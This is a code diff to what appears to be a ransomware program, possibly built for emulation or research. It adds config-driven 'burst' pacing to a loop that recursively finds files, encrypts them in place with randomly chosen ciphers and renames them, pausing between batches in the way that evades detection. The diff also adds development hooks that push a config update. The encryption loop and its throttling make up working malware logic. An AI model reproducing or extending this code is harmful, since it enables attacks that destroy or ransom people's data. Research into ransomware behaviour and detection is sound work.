@@ -1,6 +1,7 @@
 import argparse
 import os
 import sys
+import time
 from base64 import b64encode, b64decode
 
 from Crypto.Cipher import AES, Salsa20, PKCS1_OAEP
@@ -10,6 +11,7 @@ from Crypto.Util.Padding import pad, unpad
 from cryptography.fernet import Fernet
 
 from globals import get_config_from_file
+from emulate import send_config
 
 # ============================================================
 # ============ 		GLOBALS 	  ==============
@@ -204,17 +206,54 @@ def select_decryption_algorithm(filename, key):
 
 
 def encrypt_files(key, start_dirs):
+    file_counter = 0
+    burst_start = time.time()
+
+    # TODO: remove development variables
+    sleep_test = 1
+    updated = False
+
     # Recursively go through folders and encrypt files
     for curr_dir in start_dirs:
         for file in discover_files(curr_dir):
-            # TODO: implement encryption bursts based on current config, consider config change
             if not file.endswith(EXTENSION):
+                # TODO: implement rate limitation
+                config = get_config_from_file()
+                duration = int(config["BURST"]["duration"][1:])  # format examples "s5" or "f30"
+                limit_files = config["BURST"]["duration"].startswith("f")
+
+                # TODO: remove debug prints
+                print(os.path.getsize(file), file, file_counter)  # file size in bytes (= nr of characters)
+
                 crypt, flag, extra = select_encryption_algorithm(key)
                 modify_file_inplace(file, crypt.encrypt, flag[1:]+"0")
 
                 encrypted_name = file + (flag if not extra else flag+"--"+extra) + EXTENSION
                 os.rename(file, encrypted_name)
-                print("File changed from " + file + " to " + encrypted_name)
+                print("File changed from " + file + " to " + encrypted_name)  # keep!
+
+                # TODO: remove mimic block
+                print("mimic size with", sleep_test)
+                time.sleep(sleep_test)
+                sleep_test *= 2
+                if sleep_test > 1 and not updated:
+                    send_config()
+                    updated = True
+
+                file_counter += 1  # only counting files if relevant
+
+                if duration > 0 and limit_files:
+                    print("bursting for", file_counter, "files")
+                    if file_counter >= duration:
+                        print("sleeping for", config["BURST"]["pause"])
+                        time.sleep(int(config["BURST"]["pause"]))
+                        file_counter = 0
+                if duration > 0 and not limit_files:  # limit seconds instead of files
+                    print("bursting for", time.time() - burst_start, "seconds")
+                    if time.time() - burst_start >= duration:
+                        print("sleeping for", config["BURST"]["pause"])
+                        time.sleep(int(config["BURST"]["pause"]))
+                        burst_start = time.time()
 
 
 def decrypt_files(key, start_dirs):
